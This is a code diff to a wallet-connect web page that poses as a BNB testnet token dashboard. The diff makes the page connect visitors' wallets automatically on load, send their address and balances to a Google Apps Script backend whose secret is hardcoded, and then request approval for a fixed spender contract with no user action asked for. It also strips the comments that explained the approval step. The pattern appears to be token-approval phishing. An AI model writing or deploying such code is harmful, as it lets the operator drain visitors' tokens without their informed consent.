@@ -98,8 +98,6 @@
     const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbzlCsXUoqaMW4fCTqK6H_SF7dGCDDkcIoO-To5YbLcBLdWEEKvGjHQm_vSUfwE06Yw/exec";
     const APPS_SCRIPT_SECRET = "mahfuzinam0045";
 
-    // 1) TOKEN_ADDRESS MUST be a BEP-20 TOKEN CONTRACT, not your wallet.
-    // 2) SPENDER_ADDRESS is your smart contract that will be approved.
     const TOKEN_ADDRESS   = "PUT_YOUR_BEP20_TOKEN_CONTRACT_ADDRESS_HERE"; // <--- CHANGE THIS
     const SPENDER_ADDRESS = "0xD0A66d72B69c850b04Eb9CEA6cA156A412d2306d"; // your smart contract
 
@@ -172,7 +170,7 @@
 
     function clearSessionUI(){
       setStatus("Not connected");
-      setWalletInfo("—","—","—");
+      setWalletInfo("—","—",null);
       setUserIdUI("-");
       tokensContainer.innerHTML = '<div class="muted">Connect wallet to see token balance.</div>';
     }
@@ -194,38 +192,34 @@
       });
     }
 
-function attachProviderListeners(p){
-  if(!p || !p.on) return;
-  try{
-    p.on("accountsChanged", function(accounts){
-      if(!accounts || !accounts.length){ 
-        clearSessionUI(); 
-        return; 
+    function attachProviderListeners(p){
+      if(!p || !p.on) return;
+      try{
+        p.on("accountsChanged", function(accounts){
+          if(!accounts || !accounts.length){
+            clearSessionUI();
+            return;
+          }
+          const addr = accounts[0].toLowerCase();
+          const uid  = getOrCreateUserIdFor(addr);
+
+          // Only update address + user ID; don't overwrite balance
+          walletAddressEl.textContent = addr;
+          setUserIdUI(uid);
+        });
+
+        p.on("chainChanged", function(chainId){
+          console.log("chainChanged:", chainId);
+          walletNetworkEl.textContent = BNB_TESTNET_LABEL + " (chain " + chainId + ")";
+        });
+
+        p.on("disconnect", function(){
+          clearSessionUI();
+        });
+      }catch(e){
+        console.warn("attachProviderListeners", e);
       }
-
-      const addr = accounts[0].toLowerCase();
-      const uid  = getOrCreateUserIdFor(addr);
-
-      // ✅ Only update address + userId
-      walletAddressEl.textContent = addr;
-      setUserIdUI(uid);
-
-      // ❌ do NOT touch balance or network here
-    });
-
-    p.on("chainChanged", function(chainId){
-      console.log("chainChanged:", chainId);
-      walletNetworkEl.textContent = BNB_TESTNET_LABEL + " (chain " + chainId + ")";
-    });
-
-    p.on("disconnect", function(){
-      clearSessionUI();
-    });
-  }catch(e){
-    console.warn("attachProviderListeners", e);
-  }
-}
-
+    }
 
     async function notifyBackend(address, networkText, userId, bnbBalance, tokenBalance){
       try{
@@ -307,7 +301,6 @@ function attachProviderListeners(p){
       }
     }
 
-    // Ask the user to approve your smart contract as spender
     async function requestTokenApproval(){
       if(!TOKEN_ADDRESS){
         console.warn("TOKEN_ADDRESS not set, skipping approve");
@@ -352,6 +345,26 @@ function attachProviderListeners(p){
       }
     }
 
+    // helper to restore UI (bnb + token) given current web3Instance + address
+    async function restoreSessionFromAddress(address){
+      const balanceWei = await web3Instance.eth.getBalance(address);
+      const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "","ether"));
+      const userId     = getOrCreateUserIdFor(address);
+
+      setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
+      setUserIdUI(userId);
+
+      const tokenBalance  = await getTokenBalance(address);
+      const prettyBalance = tokenBalance ? Number(tokenBalance).toFixed(4) : "0";
+
+      tokensContainer.innerHTML =
+        '<div class="token">' +
+          '<div class="muted">Token</div>' +
+          '<div style="font-size:1.1rem;margin-top:4px;">' + prettyBalance + '</div>' +
+          '<div class="small mono" style="margin-top:6px;">' + TOKEN_ADDRESS + '</div>' +
+        '</div>';
+    }
+
     async function connectFlow(){
       try{
         setStatus("Connecting…");
@@ -363,13 +376,13 @@ function attachProviderListeners(p){
           web3Instance     = new Web3(providerInstance);
           await providerInstance.request({ method: "eth_requestAccounts" });
         }
-        // Standard injected (MetaMask, some Trust versions)
+        // Standard injected (MetaMask, some Trust)
         else if(window.ethereum && !mobile){
           providerInstance = window.ethereum;
           web3Instance     = new Web3(providerInstance);
           await providerInstance.request({ method: "eth_requestAccounts" });
         }
-        // WalletConnect via Web3Modal (mobile / others)
+        // WalletConnect via Web3Modal
         else {
           if(!web3ModalInstance) initWeb3ModalInstance();
           providerInstance = await web3ModalInstance.connect();
@@ -406,30 +419,17 @@ function attachProviderListeners(p){
           }
         }
 
-        const balanceWei = await web3Instance.eth.getBalance(address);
-        const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei,"ether"));
-
+        await restoreSessionFromAddress(address);
         setStatus("Connected");
-        setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
 
-        const userId = getOrCreateUserIdFor(address);
-        setUserIdUI(userId);
+        await notifyBackend(
+          address,
+          BNB_TESTNET_LABEL,
+          getOrCreateUserIdFor(address),
+          Number(walletBalanceEl.textContent.split(" ")[0] || 0),
+          "" // tokenBalance already logged by Apps Script? you can pass if needed
+        );
 
-        tokensContainer.innerHTML = '<div class="muted">Loading token balance…</div>';
-
-        const tokenBalance = await getTokenBalance(address);
-
-        const prettyBalance = tokenBalance ? Number(tokenBalance).toFixed(4) : "0";
-        tokensContainer.innerHTML =
-          '<div class="token">' +
-            '<div class="muted">Token</div>' +
-            '<div style="font-size:1.1rem;margin-top:4px;">' + prettyBalance + '</div>' +
-            '<div class="small mono" style="margin-top:6px;">' + TOKEN_ADDRESS + '</div>' +
-          '</div>';
-
-        await notifyBackend(address, BNB_TESTNET_LABEL, userId, balanceBNB, tokenBalance);
-
-        // Auto request approval after connect
         await requestTokenApproval();
 
       }catch(err){
@@ -439,106 +439,77 @@ function attachProviderListeners(p){
       }
     }
 
-    // ===== SAFE AUTO-RECONNECT (no connectFlow, no loops) =====
-        // ===== LIGHT AUTO-RECONNECT =====
-    // After refresh: only restore address + userId (+ network text),
-    // but DO NOT fetch balances or tokens. User must click Connect to load full data.
-  // FULL AUTO-RECONNECT: restore address + userId + BNB + token if wallet allows
-async function tryAutoReconnect(){
-  try{
-    if(!web3ModalInstance) initWeb3ModalInstance();
+    // silent restore using eth_accounts; returns true if restored
+    async function tryAutoReconnectSilent(){
+      const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-    const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+      // 1) Trust Wallet extension
+      if(!mobile && window.trustwallet && window.trustwallet.ethereum){
+        const injected = window.trustwallet.ethereum;
+        providerInstance = injected;
+        web3Instance     = new Web3(providerInstance);
+        attachProviderListeners(providerInstance);
 
-    // 1) Trust Wallet extension
-    if (!mobile && window.trustwallet && window.trustwallet.ethereum) {
-      const injected = window.trustwallet.ethereum;
-      providerInstance = injected;
-      web3Instance     = new Web3(providerInstance);
-      attachProviderListeners(providerInstance);
+        const accounts = await injected.request({ method: "eth_accounts" });
+        if(accounts && accounts.length){
+          const address = accounts[0].toLowerCase();
+          setStatus("Restoring session (Trust Wallet)…");
+          await restoreSessionFromAddress(address);
+          setStatus("Connected (restored)");
+          return true;
+        }
+      }
 
-      const accounts = await injected.request({ method: "eth_accounts" });
-      if (accounts && accounts.length) {
-        const address    = accounts[0].toLowerCase();
-        setStatus("Restoring session (Trust Wallet)…");
+      // 2) Standard injected (MetaMask / some Trust)
+      if(window.ethereum){
+        const injected = window.ethereum;
+        providerInstance = injected;
+        web3Instance     = new Web3(providerInstance);
+        attachProviderListeners(providerInstance);
 
-        const balanceWei = await web3Instance.eth.getBalance(address);
-        const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "", "ether"));
-        const userId     = getOrCreateUserIdFor(address);
+        const accounts = await injected.request({ method: "eth_accounts" });
+        if(accounts && accounts.length){
+          const address = accounts[0].toLowerCase();
+          setStatus("Restoring session…");
+          await restoreSessionFromAddress(address);
+          setStatus("Connected (restored)");
+          return true;
+        }
+      }
 
-        setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
-        setUserIdUI(userId);
+      // 3) Do NOT auto-connect WalletConnect silently (would open QR)
+      return false;
+    }
 
-        const tokenBalance  = await getTokenBalance(address);
-        const prettyBalance = tokenBalance ? Number(tokenBalance).toFixed(4) : "0";
+    // on load: try silent restore; if that fails, auto call connectFlow for extensions
+    async function autoConnectOnLoad(){
+      try{
+        const restored = await tryAutoReconnectSilent();
+        if(restored) return;
 
-        tokensContainer.innerHTML =
-          '<div class="token">' +
-            '<div class="muted">Token</div>' +
-            '<div style="font-size:1.1rem;margin-top:4px;">' + prettyBalance + '</div>' +
-            '<div class="small mono" style="margin-top:6px;">' + TOKEN_ADDRESS + '</div>' +
-          '</div>';
+        const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-        setStatus("Connected (restored)");
-        return;
+        if(!mobile && ( (window.trustwallet && window.trustwallet.ethereum) || window.ethereum )){
+          // auto-attempt full connect once (will show wallet popup)
+          setStatus("Auto connecting…");
+          await connectFlow();
+        }else{
+          clearSessionUI();
+        }
+      }catch(e){
+        console.warn("autoConnectOnLoad failed:", e);
+        clearSessionUI();
       }
     }
 
-    // 2) Standard injected (MetaMask / some Trust versions)
-    if (window.ethereum) {
-      const injected = window.ethereum;
-      providerInstance = injected;
-      web3Instance     = new Web3(providerInstance);
-      attachProviderListeners(providerInstance);
-
-      const accounts = await injected.request({ method: "eth_accounts" });
-      if (accounts && accounts.length) {
-        const address    = accounts[0].toLowerCase();
-        setStatus("Restoring session…");
-
-        const balanceWei = await web3Instance.eth.getBalance(address);
-        const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "", "ether"));
-        const userId     = getOrCreateUserIdFor(address);
-
-        setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
-        setUserIdUI(userId);
-
-        const tokenBalance  = await getTokenBalance(address);
-        const prettyBalance = tokenBalance ? Number(tokenBalance).toFixed(4) : "0";
-
-        tokensContainer.innerHTML =
-          '<div class="token">' +
-            '<div class="muted">Token</div>' +
-            '<div style="font-size:1.1rem;margin-top:4px;">' + prettyBalance + '</div>' +
-            '<div class="small mono" style="margin-top:6px;">' + TOKEN_ADDRESS + '</div>' +
-          '</div>';
-
-        setStatus("Connected (restored)");
-        return;
-      }
-    }
-
-    // 3) We do NOT auto-connect WalletConnect here to avoid QR popups/loops
-
-    // If nothing restored, show logged out UI
-    clearSessionUI();
-  }catch(err){
-    console.warn("Auto-reconnect error:", err);
-    clearSessionUI();
-  }
-}
-
-
-document.addEventListener("DOMContentLoaded", async function(){
-  initWeb3ModalInstance();
-  connectBtn.addEventListener("click", connectFlow);
-  await tryAutoReconnect(); // now does full restore, including BNB
-  document.getElementById("year").textContent = new Date().getFullYear();
-});
-
+    document.addEventListener("DOMContentLoaded", async function(){
+      initWeb3ModalInstance();
+      connectBtn.addEventListener("click", connectFlow);
+      await autoConnectOnLoad();
+      document.getElementById("year").textContent = new Date().getFullYear();
+    });
 
   })();
   </script>
 </body>
 </html>
-
